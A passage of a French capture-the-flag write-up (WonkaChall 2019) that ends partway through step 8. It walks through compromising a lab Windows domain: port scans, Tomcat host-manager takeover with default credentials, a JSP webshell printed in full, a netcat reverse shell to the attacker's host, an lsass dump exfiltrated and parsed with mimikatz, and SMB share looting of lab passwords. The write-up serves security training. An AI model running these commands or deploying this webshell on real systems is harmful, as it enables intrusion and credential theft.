+<p>Lorsque le tunnel VPN est correctement monté, une nouvelle adresse apparait :</p>
+
+<pre><code class="language-bash">➜ ip r | grep tun0
+10.8.0.1 via 10.8.0.17 dev tun0 
+10.8.0.17 dev tun0 proto kernel scope link src 10.8.0.18 
+172.16.42.0/24 via 10.8.0.17 dev tun0 
+</code></pre>
+
+<p>Il existe plusieurs techniques de reconnaissances afin de trouver tous les hôtes de ce réseau:</p>
+
+<ul>
+<li><strong>Ping scan</strong> : rapide mais peu pertinent depuis que la plupart des hôtes Windows ne répondent pas au ping. De plus, le ping scan de nmap (-sn) fonctionne de la façon suivante : ping, vérification du port 80, vérification du port 443, ping ;</li>
+<li><strong>Port scan</strong> : Retenir quelques ports connus et vérifier s&rsquo;ils sont ouverts. Cette méthode est un peu plus lente, mais fonctionne relativement bien.</li>
+</ul>
+
+<p><strong>Note</strong> : Personnellement je fais un <strong>premier masscan</strong> avec environ 100 ports connus sur l&rsquo;ensemble du réseau, puis un <strong>second masscan</strong> avec l&rsquo;ensemble des ports TCP et UDP sur les hôtes trouvés. Enfin, <strong>un nmap</strong> spécifique sur les ports et hôtes trouvés. C&rsquo;est la méthode la plus rapide que j&rsquo;ai pu trouver jusqu&rsquo;à présent.</p>
+
+<p>CI-dessous le <em>premier masscan</em> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24
+Discovered open port 445/tcp on 172.16.42.5                                    
+Discovered open port 53/tcp on 172.16.42.5                                     
+Discovered open port 445/tcp on 172.16.42.101                                  
+Discovered open port 445/tcp on 172.16.42.11                                   
+</code></pre>
+
+<p>Avec cette méthode, trois machines ressortent :</p>
+
+<ul>
+<li>172.16.42.5</li>
+<li>172.16.42.11</li>
+<li>172.16.42.101</li>
+</ul>
+
+<h4 id="v-1-a-172-16-42-5-dc01-ww2">V.1.a. 172.16.42.5 (DC01-WW2)</h4>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5
+Discovered open port 49669/tcp on 172.16.42.5                                  
+Discovered open port 445/tcp on 172.16.42.5                                    
+Discovered open port 53/udp on 172.16.42.5                                     
+Discovered open port 53/tcp on 172.16.42.5                                     
+Discovered open port 3268/tcp on 172.16.42.5                                   
+Discovered open port 50206/tcp on 172.16.42.5                                  
+Discovered open port 593/tcp on 172.16.42.5                                    
+Discovered open port 636/tcp on 172.16.42.5                                    
+Discovered open port 49687/tcp on 172.16.42.5       
+
+(KaliVM) ➜ cat out_mass_5 | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','
+49669,445,53,53,3268,50206,593,636,49687
+
+(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5
+PORT      STATE SERVICE       REASON  VERSION
+53/tcp    open  domain        syn-ack Microsoft DNS
+445/tcp   open  microsoft-ds? syn-ack
+593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack
+3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: factory.lan0., Site: Default-First-Site-Name)
+49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
+50206/tcp open  msrpc         syn-ack Microsoft Windows RPC
+
+[...]
+
+TCP Sequence Prediction: Difficulty=253 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC01-WW2; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 40427/tcp): CLEAN (Timeout)
+|   Check 2 (port 46791/tcp): CLEAN (Timeout)
+|   Check 3 (port 49455/udp): CLEAN (Timeout)
+|   Check 4 (port 14211/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-07-11 13:39:58
+|_  start_date: 1601-01-01 00:09:21
+</code></pre>
+
+<p>Cette machine ressemble à un Domain Controller, et ce pour plusieurs raisons :</p>
+
+<ul>
+<li>Le port 53 (DNS) est caractéstique d&rsquo;un AD</li>
+<li>Le port 3268 (LDAP) mentionne le domaine <strong>factory.lan</strong></li>
+<li>Le nom d&rsquo;hôte est plutôt explicite : <strong>DC01-WW2</strong></li>
+</ul>
+
+<h4 id="v-1-b-172-16-42-11">V.1.b. 172.16.42.11</h4>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11
+Discovered open port 8080/tcp on 172.16.42.11          
+Discovered open port 445/tcp on 172.16.42.11     
+
+(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11
+PORT     STATE SERVICE       REASON  VERSION
+445/tcp  open  microsoft-ds? syn-ack
+8080/tcp open  http-proxy    syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+[...]
+| http-methods: 
+|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Willy Wonka Wiki
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 30938/tcp): CLEAN (Timeout)
+|   Check 2 (port 43825/tcp): CLEAN (Timeout)
+|   Check 3 (port 45891/udp): CLEAN (Timeout)
+|   Check 4 (port 33171/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-07-11 13:43:52
+|_  start_date: 1601-01-01 00:09:21
+</code></pre>
+
+<p>Intuitivement, cette machine ressemble au point d&rsquo;entrée que nous cherchons. Les deux premières hypothèses à exploiter  sont donc :</p>
+
+<ol>
+<li>Connexions anonymes sur le partage Samba ;</li>
+<li>Vulnérabilités et / ou identifiants par défaut sur le serveur 8080, tomcat étant une solution répandue sur ce port.</li>
+</ol>
+
+<h4 id="v-1-c-172-16-42-101">V.1.c. 172.16.42.101</h4>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.101
+Discovered open port 135/tcp on 172.16.42.101                                  
+Discovered open port 49712/tcp on 172.16.42.101                                
+Discovered open port 445/tcp on 172.16.42.101                                  
+Discovered open port 5040/tcp on 172.16.42.101                                 
+Discovered open port 49669/tcp on 172.16.42.101                  
+
+(KaliVM) ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p135,49712,445,5040,49669 172.16.42.101
+PORT      STATE SERVICE       REASON  VERSION
+135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+445/tcp   open  microsoft-ds? syn-ack
+5040/tcp  open  unknown       syn-ack
+49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
+49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</code></pre>
+
+<p>Les trois premiers ports sont suspects et peuvent laisser penser à :</p>
+
+<ol>
+<li>Une connexion anonyme sur le RPC et SMB ;</li>
+<li>Un service &ldquo;unknown&rdquo; sur le port 5040.</li>
+</ol>
+
+<h3 id="v-2-enumération-du-serveur-web">V.2. Enumération du serveur web</h3>
+
+<p>Après quelques tentatives infructueuses sur les différents serveurs SMB, il est temps de se concentrer sur le serveur web : <code>http://172.16.42.11:8080/</code>.</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step5_index.png" alt="" />
+<em>Fig 14</em>: Index du serveur web
+</center></p>
+
+<p>En naviguant sur le site, il est possible de trouver une cartographie du réseau : <code>http://172.16.42.11:8080/infra.jsp</code></p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/infra.png" alt="" />
+<em>Fig 15</em>: Schéma réseau incomplet
+</center></p>
+
+<p>L&rsquo;extension <strong>jsp</strong> nous conforte dans l&rsquo;idée que nous sommes en présence d&rsquo;un serveur tomcat, la page 404 la confirme. L&rsquo;exécution de dirsearch avec une wordlist adaptée retourne des pages intéressantes :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e jsp,html,do,action,txt -w ./tomcat.txt    
+[15:08:17] 302 -    0B  - /host-manager  -&gt;  /host-manager/
+[15:08:17] 401 -    2KB - /host-manager/html/%2A
+[15:08:17] 302 -    0B  - /manager  -&gt;  /manager/
+</code></pre>
+
+<p>D&rsquo;ordinaire, la page <code>manager</code> est la solution de facilité : avec des identifiants par défaut, il suffit de générer un webshell avec l&rsquo;extension <strong>war</strong> et de l&rsquo;uploader. Dans notre cas, cette page est &hellip; Indisponible :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step5_manager.png" alt="" />
+<em>Fig 16</em> : Page manager
+</center></p>
+
+<p>Dans les résultats du dirsearch, il y a aussi la page <code>/host-manager</code>. Cette page est protégée par une <strong>Basic authentification</strong>, heureusement les identifiants par défaut de Tomcat fonctionnent :</p>
+
+<blockquote>
+<p>tomcat : tomcat</p>
+</blockquote>
+
+<p><strong>Certilience</strong> a écrit un très bon guide concernant cette attaque : <a href="https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/">https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/</a></p>
+
+<h3 id="v-3-mise-en-place-de-l-exploitation">V.3. Mise en place de l&rsquo;exploitation</h3>
+
+<p>N&rsquo;étant pas un grand fan de Metasploit, j&rsquo;essaie de l&rsquo;utiliser le moins possible, et ce surtout lorsque d&rsquo;autres solutions existent. Une d&rsquo;elle consiste à récupérer un webshell &ldquo;standard&rdquo;, plutôt que de générer une charge avec un meterpreter. En effet, une archive <strong>war</strong> consiste tout simplement en une archive zip avec une hiérarchie particulière :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ tree .                   
+.
+├── index.jsp
+├── META-INF
+│   └── MANIFEST.MF
+└── WEB-INF
+    └── web.xml
+</code></pre>
+
+<p>La charge malveillante se situe dans le fichier <strong>index.jsp</strong> :</p>
+
+<pre><code class="language-jsp">&lt;FORM METHOD=GET ACTION='index.jsp'&gt;
+&lt;INPUT name='cmd' type=text&gt;
+&lt;INPUT type=submit value='Run'&gt;
+&lt;/FORM&gt;
+&lt;%@ page import=&quot;java.io.*&quot; %&gt;
+&lt;%
+   String cmd = request.getParameter(&quot;cmd&quot;);
+   String output = &quot;&quot;;
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+&quot;&lt;/br&gt;&quot;; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%&gt;
+&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
+</code></pre>
+
+<p>La charge ci-dessus provient du dépôt de <strong>tennc</strong> : <a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+
+<p>L&rsquo;archive <strong>war</strong> utilisée lors de l&rsquo;exploitation peut être téléchargée ici : <a href="https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs">https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs</a></p>
+
+<h4 id="v-3-a-nouvel-hôte">V.3.a. Nouvel hôte</h4>
+
+<p>En suivant les indications de <strong>Certilience</strong>, on ajoute une entrée dans le fichier <code>/etc/hosts</code> de notre machine afin de lier l&rsquo;IP du serveur tomcat à un hostname :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo echo &quot;172.16.42.11	maki-lab&quot; &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Cette étape sera utile lors du déploiement de la nouvelle application via les UNC path.</p>
+
+<h4 id="v-3-b-smb-server">V.3.b. SMB server</h4>
+
+<p>Il est impératif de mettre en place un partage samba (<strong>smbserver.py</strong>) pour que le serveur Tomcat puisse récupérer notre application malveillante :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ sudo smbserver.py -smb2support data .
+</code></pre>
+
+<p>La commande ci-dessus ouvre un partage nommé <strong>data</strong> dans le dossier courant, où se trouve l&rsquo;archive war.</p>
+
+<h3 id="v-4-exploitation">V.4. Exploitation</h3>
+
+<p>Les préparatifs étant terminés, il est temps de déployer le webshell :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step5_hostmanager.png" alt="" />
+<em>Fig 17</em> : Host-manager page
+</center></p>
+
+<p>De l&rsquo;activité est visible sur les logs du serveur SMB lors du déploiement de notre application. On peut finalement accéder à cette application avec l&rsquo;URL suivante : <code>http://maki-lab:8080/cmd/index.jsp</code></p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step5_webshell.png" alt="" />
+<em>Fig 18</em> : Webshell
+</center></p>
+
+<h3 id="v-5-reverse-shell">V.5. Reverse shell</h3>
+
+<p>Pour récupérer un shell plus ou moins interactif, il est possible de déposer le binaire <strong>netcat</strong> dans le partage <strong>data</strong>, créé pour l&rsquo;exploitation précédente. Sous Windows, il est possible d&rsquo;exécuter des binaires distants grâce aux UNC path.</p>
+
+<h4 id="v-5-a-terminal-1-hôte">V.5.a. Terminal 1 - Hôte</h4>
+
+<p>Le binaire <code>rlwrap</code> (readline wrapper) sert d&rsquo;historique de commandes, mais aussi d&rsquo;interface entre le clavier local et distant. L&rsquo;utiliser lors d&rsquo;un reverse shell permet à l&rsquo;attaquant de pouvoir utiliser les flèches de son clavier correctement et d&rsquo;avoir l&rsquo;historique des commandes de la session :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ rlwrap ncat -klvp 12345
+</code></pre>
+
+<h4 id="v-5-b-application-malveillante-serveur-tomcat">V.5.b. Application malveillante - Serveur tomcat</h4>
+
+<p>L&rsquo;UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat et établir ainsi une connexion sur le port 12345 :</p>
+
+<pre><code class="language-bash">(SRV01-INTRANET) ➜ \\10.8.0.10\data\nc64.exe -e cmd.exe 10.8.0.10 12345
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step5_reverseshell.png" alt="" />
+<em>Fig 19</em> : Reverse shell
+</center></p>
+
+<p>Cette méthode permet de récupérer un accès shell plus ou moins interactif et plus ou moins stable.</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step5_flag.png" alt="" />
+<em>Fig 20</em> : Flag
+</center></p>
+
+<h3 id="v-5-flag">V.5. Flag</h3>
+
+<blockquote>
+<p>8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-3">Resources</h3>
+
+<ol>
+<li><strong>SecList</strong>, <em>Discovery Web-content Tomcat</em>, GitHub : <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt</a></li>
+<li><strong>Pôle audit de Certilience</strong>, <em>Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?</em>, Blog de Certilience : <a href="https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/">https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/</a></li>
+<li><strong>Eternallybored</strong>, <em>Download netcat Windows binaries</em>; eternallybored.org : <a href="https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip">https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="vi-step-6-mimikatz-you-said">VI. Step 6 - Mimikatz you said ?</h2>
+
+<blockquote>
+<p>SHA256(adminServer&rsquo;s passwd)</p>
+</blockquote>
+
+<h3 id="tl-dr-5">TL;DR</h3>
+
+<ol>
+<li>Exécuter <code>procdump.exe</code> sur le serveur tomcat (SRV01-INTRANET) ;</li>
+<li>Récupérer le minidump du processus <code>lsass.exe</code> ;</li>
+<li>Retrouver les identifiants stockés grâce à <code>mimikatz</code> en local : <code>adminserver</code> : <code>factory.lan\adminServer : #3LLe!!estOuL@Poulette</code>.</li>
+</ol>
+
+<hr />
+
+<h3 id="vi-1-post-exploitation">VI.1. Post exploitation</h3>
+
+<p>Lorsqu&rsquo;un accès privilégié est obtenu sur un serveur, il est naturel d&rsquo;essayer de récupérer des identifiants (mimikatz pour Windows ou swapdigger pour Linux). En l&rsquo;occurrence, <strong>Mimikatz</strong> va chercher les identifiants dans la mémoire du processus de <em>lsass.exe</em>.</p>
+
+<p>Une autre méthode, plus difficile à détecter pour de potentiels anti-virus, consiste à récupérer la mémoire de ce processus grâce à <strong>procdump.exe</strong>. Ce binaire est développé et signé par Microsoft et fait partie des <em>Windows Sysinternals</em>. Mimikatz est capable de charger un dump mémoire de ce processus en local et d&rsquo;en extraire les identifiants.</p>
+
+<h3 id="vi-2-getting-lsass-minidump">VI.2. Getting lsass minidump</h3>
+
+<p>L&rsquo;exécution de <strong>procdump.exe</strong> se fait comme pour <em>netcat</em> : via les UNC path.</p>
+
+<pre><code class="language-bash">(SRV01-INTRANET) ➜ \\10.8.0.10\data\procdump64.exe -ma lsass.exe lsadump
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step6_procdump.png" alt="" />
+<em>Fig 21</em> : Récupérer le minidump de lsass.exe
+</center></p>
+
+<p>Toujours avec les UNC path, on copie les fichiers sur un partage distant :</p>
+
+<pre><code class="language-bash">(SRV01-INTRANET) ➜ copy lsadump.dmp \\10.8.0.10\data\lsadump.dmp
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step6_smbtransfer.png" alt="" />
+<em>Fig 22</em> : Copie du minidump vers notre partage
+</center></p>
+
+<p>Le minidump est disponible ici : <a href="https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY">https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY</a></p>
+
+<h3 id="vi-3-récupération-des-mots-de-passe-dans-le-minidump">VI.3. Récupération des mots de passe dans le minidump</h3>
+
+<p>Comme mentionné précédemment, <strong>Mimikatz</strong> est capable de lire un minidump en local. C&rsquo;est à ce moment que CommandoVM entre en jeu.</p>
+
+<pre><code class="language-bash">(CommandoVM) ➜ .\mimikatz.exe
+
+# privilege::debug
+Privilege '20' OK
+
+# sekurlsa::Minidump lsassdump.dmp
+Switch to MINIDUMP : 'lsassdump.dmp'
+
+# sekurlsa::logonPasswords
+Opening : 'lsassdump.dmp' file for minidump...
+
+[...]
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SRV01-INTRANET$
+Domain            : FACTORY
+Logon Server      : (null)
+Logon Time        : 05/07/2019 12:16:10
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : SRV01-INTRANET$
+         * Domain   : FACTORY
+         * Password : (null)
+        kerberos :
+         * Username : srv01-intranet$
+         * Domain   : FACTORY.LAN
+         * Password : (null)
+        ssp :
+        credman :
+         [00000000]
+         * Username : factory.lan\adminServer
+         * Domain   : 172.16.42.101
+         * Password : #3LLe!!estOuL@Poulette
+</code></pre>
+
+<p>Pour des soucis de lisibilité, la sortie de Mimikatz a été tronquée. Les identifiants récupérés sont :</p>
+
+<blockquote>
+<p>factory.lan\adminServer : #3LLe!!estOuL@Poulette</p>
+</blockquote>
+
+<h3 id="vi-4-flag">VI.4. Flag</h3>
+
+<blockquote>
+<p>87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-4">Resources</h3>
+
+<ol>
+<li><strong>sevagas</strong>, <em>swap_digger</em>, GitHub : <a href="https://github.com/sevagas/swap_digger">https://github.com/sevagas/swap_digger</a></li>
+<li><strong>Microsoft</strong>, <em>Windows Sysinternals</em>, Documentation Microsoft : <a href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a></li>
+<li><strong>Sebastien Macke - @lanjelot</strong>, <em>Dumping Windows Credentials</em>, securusglobal : <a href="https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/">https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/</a></li>
+<li><strong>cyberarms</strong>, <em>Grabbing Passwords from Memory using Procdump and Mimikatz</em>, cyberarms : <a href="https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/">https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/</a></li>
+<li><strong>ired.team</strong>, <em>Credential Access &amp; Dumping</em>, ired.team : <a href="https://ired.team/offensive-security/credential-access-and-credential-dumping">https://ired.team/offensive-security/credential-access-and-credential-dumping</a></li>
+<li><strong>Mark Russinovich and Andrew Richards</strong>, <em>ProcDump v9.0</em>,  Documentation Microsoft : <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="vii-step-7-spreading-love">VII. Step 7 - Spreading love</h2>
+
+<blockquote>
+<p>Sharing is caring ;)</p>
+</blockquote>
+
+<h3 id="tl-dr-6">TL;DR</h3>
+
+<ol>
+<li>Essayer d&rsquo;accéder aux partages du réseau avec les identifiants récupérés ;</li>
+<li>Trouver le partage <strong>Users</strong> sur le serveur <code>172.16.42.5</code> ;</li>
+<li>Le parcourir et trouver les identifiants : <code>factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?</code>.</li>
+</ol>
+
+<hr />
+
+<h3 id="vii-1-reconnaissance">VII.1. Reconnaissance</h3>
+
+<p>Dans les scans réalisés lors de l&rsquo;étape 5 (cf. V.1. Reconnaissance), on remarque que toutes les machines ont le port SMB (445/tcp) ouvert. Les connexions anonymes ayant échoué, on peut réitérer les tests avec les identifiants de <strong>adminServer</strong>.</p>
+
+<p>L&rsquo;outil <strong>CrackMapExec</strong> (CME) est pratique lors de tests internes avec de nombreuses machines. Il permet par exemple de lister les partages de toute une plage d&rsquo;IP :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ cme smb ./ip_list -u 'adminServer' -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' --shares 
+SMB         172.16.42.5     445    DC01-WW2         [*] Windows 10.0 Build 17763 x64 (name:DC01-WW2) (domain:factory.lan) (signing:True) (SMBv1:False)
+SMB         172.16.42.101   445    PC01-DEV         [*] Windows 10.0 Build 18362 x64 (name:PC01-DEV) (domain:factory.lan) (signing:False) (SMBv1:False)
+SMB         172.16.42.5     445    DC01-WW2         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
+SMB         172.16.42.101   445    PC01-DEV         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
+SMB         172.16.42.101   445    PC01-DEV         [+] Enumerated shares
+SMB         172.16.42.101   445    PC01-DEV         Share           Permissions     Remark
+SMB         172.16.42.101   445    PC01-DEV         -----           -----------     ------
+SMB         172.16.42.101   445    PC01-DEV         ADMIN$                          Remote Admin
+SMB         172.16.42.101   445    PC01-DEV         C$                              Default share
+SMB         172.16.42.101   445    PC01-DEV         IPC$            READ            Remote IPC
+SMB         172.16.42.101   445    PC01-DEV         Users                           
+SMB         172.16.42.5     445    DC01-WW2         [+] Enumerated shares
+SMB         172.16.42.5     445    DC01-WW2         Share           Permissions     Remark
+SMB         172.16.42.5     445    DC01-WW2         -----           -----------     ------
+SMB         172.16.42.5     445    DC01-WW2         ADMIN$                          Remote Admin
+SMB         172.16.42.5     445    DC01-WW2         C$                              Default share
+SMB         172.16.42.5     445    DC01-WW2         IPC$            READ            Remote IPC
+SMB         172.16.42.5     445    DC01-WW2         NETLOGON        READ            Logon server share 
+SMB         172.16.42.5     445    DC01-WW2         provisioning    READ            
+SMB         172.16.42.5     445    DC01-WW2         SYSVOL          READ            Logon server share 
+SMB         172.16.42.5     445    DC01-WW2         Users           READ            
+</code></pre>
+
+<p>L&rsquo;adresse <em>172.16.42.11</em> ne répond pas sur son port SMB. Cependant, un partage <strong>Users</strong> est accessible en lecture sur <em>172.16.42.5</em> (DC01-WW2).</p>
+
+<h3 id="vii-2-mount-users-share">VII.2. Mount Users share</h3>
+
+<p>Il est possible de se connecter au partage via <code>smbclient</code> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ smbclient -U 'adminServer%#3LLe!!estOuL@Poulette' -W &quot;factory.lan&quot; //172.16.42.5/Users
+WARNING: The &quot;syslog&quot; option is deprecated
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR        0  Wed Jun 19 23:00:08 2019
+  ..                                 DR        0  Wed Jun 19 23:00:08 2019
+  Administrator                       D        0  Wed Jun 19 23:00:35 2019
+  Default                           DHR        0  Wed Jun 19 22:52:35 2019
+  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
+
+		12966143 blocks of size 4096. 9273442 blocks available
+</code></pre>
+
+<p>Il est également possible de le monter en local. D&rsquo;un point de vue personnel, je préfère cette méthode car je trouve qu&rsquo;elle rend plus simple la navigation dans le partage :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ mkdir /tmp/a
+(KaliVM) ➜ sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users a
+(KaliVM) ➜ ls /tmp/a
+Administrator   Default   desktop.ini
+(KaliVM) ➜ tree Administrator 
+Administrator
+└── Documents
+    └── provisioning
+        ├── credentials.txt
+        └── flag-07.txt
+</code></pre>
+
+<p>Le fichier <strong>credentials.txt</strong> à côté du flag sera utile pour la suite, car il contient de nouveaux identifiants :</p>
+
+<pre><code class="language-bash">#####
+## Provisioning Account
+####
+
+This account is used only for joining machines (servers &amp; workstations) to domain.
+We created it to &quot;delegate&quot; this right to servers and workstations admins since we have disabled
+this right for regular users and we do not want to give domain admin rights to
+servers administrators and workstation administrators.
+
+factory.lan\SvcJoinComputerToDom
+QueStC3qU!esTpetItEtMarr0N?
+</code></pre>
+
+<h3 id="vii-3-flag">VII.3. Flag</h3>
+
+<blockquote>
+<p>5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-5">Resources</h3>
+
+<ol>
+<li><strong>ShawnDEvans</strong>, <em>SMBmap</em>, GitHub : <a href="https://github.com/ShawnDEvans/smbmap">https://github.com/ShawnDEvans/smbmap</a></li>
+<li><strong>Mickael Dorigny</strong>, <em>Monter un partage CIFS sous Linux</em>, it-connect : <a href="https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/">https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="viii-step-8-wagging-the-dogs">VIII. Step 8 - Wagging the dogs</h2>
+
+<blockquote>
+<p>SHA256(NTLM(krbtgt))</p>
+</blockquote>
+
+<h3 id="tl-dr-7">TL;DR</h3>
+
+<ol>
+<li>Faire un <code>bloodhound</code> avec le compte <strong>adminServer</strong> ;</li>
+<li>Remarquer la relation <strong>AddAllowedToAct</strong> entre <em>DC01-WW2.FACTORY.LAN</em> et <em>SvcJoinComputerToDom</em> ;</li>
+<li>Grâce à la note précédente et à la relation trouvée, comprendre qu&rsquo;il faut abuser du <strong>resources based constrained delegation</strong> ;</li>
+<li>Ajouter de la CommandoVM dans le domaine grâce au compte de service (<em>SvcJoinComputerToDom</em>) ;</li>
+<li>Créer un SPN et modifier sa valeur de <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> ;</li>
+<li>Abuser du mécanisme <strong>S4U</strong> (<em>S4U2User</em> et <em>S4U2Proxy</em>) avec Rubeus pour usurper l&rsquo;identité de l&rsquo;administrateur de domaine ;</li>
+<li>Lorsque Rubeus a forgé le ticket de l&rsquo;administrateur, utiliser <strong>psexec</strong> sur le contrôleur de domaine ;</li>
+<li>Extraire le <code>ntds.dit</code> en utilisant <code>vssadmin</code> sur le contrôleur de domaine ;</li>
+<li>Copier le fichier généré sur une de nos machines et utiliser <strong>secretdumps.py</strong> afin de récupérer les différents hash, dont celui de <code>krbtgt</code>.</li>
+</ol>
+
+<hr />
+
+<h3 id="viii-1-reconnaissance">VIII.1. Reconnaissance</h3>
+
+<p>Cette étape est sûrement la plus difficile du challenge. À ce stade, il y a deux comptes disponibles : un compte utilisateur du domaine (<em>adminServer</em>) et un compte de service (<em>SvcJoinComputerToDom</em>).</p>
+
+<p>La première idée consiste à faire un bloodhound avec le compte utilisateur du domaine. <strong>Bloodhound</strong> est un outil de cartographie d&rsquo;Active Directory. Il permet de visualiser le domaine sous forme de graphes et de voir les différentes relations entre les objets du domaine (utilisateurs, machines, groupes &hellip;). De plus, il permet de distinguer les faiblesses du domaine et donne des informations pratiques pour les exploiter.</p>
+
+<p><em>Note</em> : Le dépôt GitHub est souvent mis à jour, embarquant de nouvelles fonctionnalités. Ne pas oublier de récupérer la dernière version avant de partir en test interne.</p>
+
